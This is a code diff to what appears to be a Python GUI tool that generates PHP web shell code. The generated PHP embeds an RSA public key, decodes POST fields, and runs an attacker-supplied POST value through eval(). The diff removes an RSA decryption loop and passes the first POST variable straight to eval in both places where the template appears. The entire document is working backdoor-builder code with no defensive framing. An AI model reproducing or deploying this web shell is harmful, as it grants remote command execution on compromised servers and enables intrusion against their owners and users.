@@ -98,14 +98,7 @@ $pk = <<<EOF
                     phpcode += self.pubKey
                     phpcode += '''
 EOF;
-$cmds = explode("|", reset(get_defined_vars()[@_POST]));
 $pk = openssl_pkey_get_public($pk);
-$cmd = "";
-foreach ($cmds as $value) {
-  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
-    $cmd .= $de;
-  }
-}
 
 foreach($_POST as $k => $v){
 	$vv = explode("|", $v);
@@ -117,6 +110,7 @@ foreach($_POST as $k => $v){
 	}
 	$_POST[$k]=$data;
 }
+$cmd = reset(get_defined_vars()[@_POST]);
 eval($cmd);'''
                     self.textEdit_3.setText(phpcode)
         except:
@@ -136,14 +130,7 @@ $pk = <<<EOF
         phpcode += self.pubKey
         phpcode += '''
 EOF;
-$cmds = explode("|", reset(get_defined_vars()[@_POST]));
 $pk = openssl_pkey_get_public($pk);
-$cmd = "";
-foreach ($cmds as $value) {
-  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
-    $cmd .= $de;
-  }
-}
 
 foreach($_POST as $k => $v){
 	$vv = explode("|", $v);
@@ -155,6 +142,7 @@ foreach($_POST as $k => $v){
 	}
 	$_POST[$k]=$data;
 }
+$cmd = reset(get_defined_vars()[@_POST]);
 eval($cmd);'''
         self.textEdit_3.setText(phpcode)
         self.writeToCache()
